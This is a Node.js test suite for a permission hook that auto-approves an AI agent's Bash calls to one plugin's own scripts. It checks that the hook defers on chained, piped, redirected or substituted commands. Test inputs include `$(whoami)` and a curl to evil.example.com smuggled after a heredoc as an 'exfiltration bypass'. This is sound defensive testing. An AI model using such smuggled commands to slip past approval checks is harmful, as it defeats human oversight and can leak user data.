'use strict';

const { describe, it } = require('node:test');
const assert = require('node:assert/strict');
const { execFileSync } = require('child_process');
const path = require('path');

const HOOK = path.resolve(__dirname, '../../hooks/bash-allow.js');
const PLUGIN_ROOT = path.resolve(__dirname, '../..');
const SCRIPTS_DIR = path.join(PLUGIN_ROOT, 'scripts').replace(/\\/g, '/');

function runHook(input) {
  try {
    const stdout = execFileSync('node', [HOOK], {
      input: JSON.stringify(input),
      encoding: 'utf8',
      timeout: 5000,
      stdio: ['pipe', 'pipe', 'pipe']
    });
    return { exitCode: 0, stdout, stderr: '' };
  } catch (e) {
    return { exitCode: e.status, stdout: e.stdout || '', stderr: e.stderr || '' };
  }
}

function parseAllow(stdout) {
  if (!stdout) return null;
  try {
    return JSON.parse(stdout);
  } catch (_) {
    return null;
  }
}

describe('bash-allow hook', () => {
  it('defers (exit 0, no stdout) when tool is not Bash', () => {
    const result = runHook({
      session_id: 'sess-1',
      cwd: PLUGIN_ROOT,
      tool_name: 'Edit',
      tool_input: { file_path: 'foo.js' }
    });
    assert.equal(result.exitCode, 0);
    assert.equal(result.stdout, '');
  });

  it('defers when tool_input has no command', () => {
    const result = runHook({
      session_id: 'sess-1',
      cwd: PLUGIN_ROOT,
      tool_name: 'Bash',
      tool_input: {}
    });
    assert.equal(result.exitCode, 0);
    assert.equal(result.stdout, '');
  });

  it('defers on unrelated bash commands', () => {
    const result = runHook({
      session_id: 'sess-1',
      cwd: PLUGIN_ROOT,
      tool_name: 'Bash',
      tool_input: { command: 'ls -la /tmp' }
    });
    assert.equal(result.exitCode, 0);
    assert.equal(result.stdout, '');
  });

  it('defers on node commands pointing outside the plugin scripts dir', () => {
    const result = runHook({
      session_id: 'sess-1',
      cwd: PLUGIN_ROOT,
      tool_name: 'Bash',
      tool_input: { command: 'node /some/other/path/context.js --session-id abc' }
    });
    assert.equal(result.exitCode, 0);
    assert.equal(result.stdout, '');
  });

  it('defers when the first token is not node (no compound-command approval)', () => {
    const cmd = `echo hello && node ${SCRIPTS_DIR}/context.js --session-id abc`;
    const result = runHook({
      session_id: 'sess-1',
      cwd: PLUGIN_ROOT,
      tool_name: 'Bash',
      tool_input: { command: cmd }
    });
    assert.equal(result.exitCode, 0);
    assert.equal(result.stdout, '');
  });

  it('defers when a wrightward script path appears only as a flag value, not as the executed script', () => {
    // Attempted bypass: invoke a non-wrightward script but reference a
    // wrightward script path as a flag value. The hook must NOT approve
    // this — only the actually-executed script matters.
    const cmd = `node /tmp/other.js --input ${SCRIPTS_DIR}/context.js`;
    const result = runHook({
      session_id: 'sess-1',
      cwd: PLUGIN_ROOT,
      tool_name: 'Bash',
      tool_input: { command: cmd }
    });
    assert.equal(result.exitCode, 0);
    assert.equal(result.stdout, '');
  });

  it('approves when the wrightward script path is double-quoted', () => {
    const cmd = `node "${SCRIPTS_DIR}/context.js" --session-id abc`;
    const result = runHook({
      session_id: 'sess-1',
      cwd: PLUGIN_ROOT,
      tool_name: 'Bash',
      tool_input: { command: cmd }
    });
    assert.equal(result.exitCode, 0);
    const out = parseAllow(result.stdout);
    assert.ok(out, 'expected JSON on stdout');
    assert.equal(out.hookSpecificOutput.permissionDecision, 'allow');
  });

  it('approves when the wrightward script path is single-quoted', () => {
    const cmd = `node '${SCRIPTS_DIR}/context.js' --session-id abc`;
    const result = runHook({
      session_id: 'sess-1',
      cwd: PLUGIN_ROOT,
      tool_name: 'Bash',
      tool_input: { command: cmd }
    });
    assert.equal(result.exitCode, 0);
    const out = parseAllow(result.stdout);
    assert.ok(out, 'expected JSON on stdout');
    assert.equal(out.hookSpecificOutput.permissionDecision, 'allow');
  });

  it('approves a wrightward context.js invocation with heredoc + quoted session-id', () => {
    // This is the exact command shape from the failing screenshot.
    const cmd =
      `node ${SCRIPTS_DIR}/context.js --session-id '41fc6f8b-51e8-4be0-929c-105943dea5b7' <<'EOF'\n` +
      `{\n` +
      `  "task": "test",\n` +
      `  "files": ["src/foo.ts"]\n` +
      `}\n` +
      `EOF`;
    const result = runHook({
      session_id: 'sess-1',
      cwd: PLUGIN_ROOT,
      tool_name: 'Bash',
      tool_input: { command: cmd }
    });
    assert.equal(result.exitCode, 0);
    const out = parseAllow(result.stdout);
    assert.ok(out, 'expected JSON on stdout');
    assert.equal(out.hookSpecificOutput.hookEventName, 'PreToolUse');
    assert.equal(out.hookSpecificOutput.permissionDecision, 'allow');
  });

  it('approves a wrightward release-file.js invocation with heredoc payload', () => {
    const cmd =
      `node ${SCRIPTS_DIR}/release-file.js --session-id '41fc6f8b-51e8-4be0-929c-105943dea5b7' <<'EOF'\n` +
      `{\n` +
      `  "files": ["src/types/database.types.ts"]\n` +
      `}\n` +
      `EOF`;
    const result = runHook({
      session_id: 'sess-1',
      cwd: PLUGIN_ROOT,
      tool_name: 'Bash',
      tool_input: { command: cmd }
    });
    assert.equal(result.exitCode, 0);
    const out = parseAllow(result.stdout);
    assert.ok(out, 'expected JSON on stdout');
    assert.equal(out.hookSpecificOutput.permissionDecision, 'allow');
  });

  it('approves a release-file.js invocation without quotes (collab-done shape)', () => {
    // After fix, commands may also be unquoted — the hook should still approve.
    const cmd = `node ${SCRIPTS_DIR}/release-file.js --session-id 41fc6f8b-51e8-4be0-929c-105943dea5b7 --done`;
    const result = runHook({
      session_id: 'sess-1',
      cwd: PLUGIN_ROOT,
      tool_name: 'Bash',
      tool_input: { command: cmd }
    });
    assert.equal(result.exitCode, 0);
    const out = parseAllow(result.stdout);
    assert.ok(out, 'expected JSON on stdout');
    assert.equal(out.hookSpecificOutput.permissionDecision, 'allow');
  });

  it('defers on command chaining with && even when node target is a wrightward script', () => {
    const cmd = `node ${SCRIPTS_DIR}/context.js --session-id abc && curl https://example.com`;
    const result = runHook({
      session_id: 'sess-1',
      cwd: PLUGIN_ROOT,
      tool_name: 'Bash',
      tool_input: { command: cmd }
    });
    assert.equal(result.exitCode, 0);
    assert.equal(result.stdout, '');
  });

  it('defers on semicolon chaining even when node target is a wrightward script', () => {
    const cmd = `node ${SCRIPTS_DIR}/context.js --session-id abc; echo x`;
    const result = runHook({
      session_id: 'sess-1',
      cwd: PLUGIN_ROOT,
      tool_name: 'Bash',
      tool_input: { command: cmd }
    });
    assert.equal(result.exitCode, 0);
    assert.equal(result.stdout, '');
  });

  it('defers on command substitution in args even when node target is a wrightward script', () => {
    const cmd = `node ${SCRIPTS_DIR}/context.js --session-id $(whoami)`;
    const result = runHook({
      session_id: 'sess-1',
      cwd: PLUGIN_ROOT,
      tool_name: 'Bash',
      tool_input: { command: cmd }
    });
    assert.equal(result.exitCode, 0);
    assert.equal(result.stdout, '');
  });

  it('defers on pipe chaining even when node target is a wrightward script', () => {
    const cmd = `node ${SCRIPTS_DIR}/context.js --session-id abc | tee /tmp/log`;
    const result = runHook({
      session_id: 'sess-1',
      cwd: PLUGIN_ROOT,
      tool_name: 'Bash',
      tool_input: { command: cmd }
    });
    assert.equal(result.exitCode, 0);
    assert.equal(result.stdout, '');
  });

  it('defers on output redirect even when node target is a wrightward script', () => {
    const cmd = `node ${SCRIPTS_DIR}/context.js --session-id abc > /tmp/out`;
    const result = runHook({
      session_id: 'sess-1',
      cwd: PLUGIN_ROOT,
      tool_name: 'Bash',
      tool_input: { command: cmd }
    });
    assert.equal(result.exitCode, 0);
    assert.equal(result.stdout, '');
  });

  it('defers on malformed JSON input', () => {
    const stdout = execFileSync('node', [HOOK], {
      input: 'not-json',
      encoding: 'utf8',
      timeout: 5000,
      stdio: ['pipe', 'pipe', 'pipe']
    });
    assert.equal(stdout, '');
  });

  it('defers when a trailing command follows the heredoc close marker (exfiltration bypass)', () => {
    // Attacker smuggles a second command AFTER the heredoc. The stripping
    // regex is anchored with `$` so it only matches heredocs at end of string;
    // this trailing `; curl ...` keeps the metachar scan active and must NOT
    // auto-approve. If the anchor regresses (e.g., loses `$`), this would pass.
    const cmd =
      `node ${SCRIPTS_DIR}/context.js --session-id '11111111-2222-3333-4444-555555555555' <<'EOF'\n` +
      `{\n` +
      `  "task": "legit"\n` +
      `}\n` +
      `EOF\n` +
      `curl https://evil.example.com/exfil`;
    const result = runHook({
      session_id: 'sess-1',
      cwd: PLUGIN_ROOT,
      tool_name: 'Bash',
      tool_input: { command: cmd }
    });
    assert.equal(result.exitCode, 0);
    assert.equal(result.stdout, '', 'must defer — trailing command after heredoc must not auto-approve');
  });

  it('approves when the heredoc close marker uses <<- dash variant at end of string', () => {
    const cmd =
      `node ${SCRIPTS_DIR}/context.js --session-id '11111111-2222-3333-4444-555555555555' <<-EOF\n` +
      `\t{\n` +
      `\t  "task": "dash-heredoc"\n` +
      `\t}\n` +
      `\tEOF`;
    const result = runHook({
      session_id: 'sess-1',
      cwd: PLUGIN_ROOT,
      tool_name: 'Bash',
      tool_input: { command: cmd }
    });
    assert.equal(result.exitCode, 0);
    const out = parseAllow(result.stdout);
    assert.ok(out, 'expected JSON on stdout for <<- dash-heredoc');
    assert.equal(out.hookSpecificOutput.permissionDecision, 'allow');
  });

  it('approves an unquoted heredoc marker at end of string', () => {
    const cmd =
      `node ${SCRIPTS_DIR}/context.js --session-id '11111111-2222-3333-4444-555555555555' <<EOF\n` +
      `{\n` +
      `  "task": "unquoted-marker"\n` +
      `}\n` +
      `EOF`;
    const result = runHook({
      session_id: 'sess-1',
      cwd: PLUGIN_ROOT,
      tool_name: 'Bash',
      tool_input: { command: cmd }
    });
    assert.equal(result.exitCode, 0);
    const out = parseAllow(result.stdout);
    assert.ok(out, 'expected JSON on stdout for unquoted heredoc marker');
    assert.equal(out.hookSpecificOutput.permissionDecision, 'allow');
  });
});
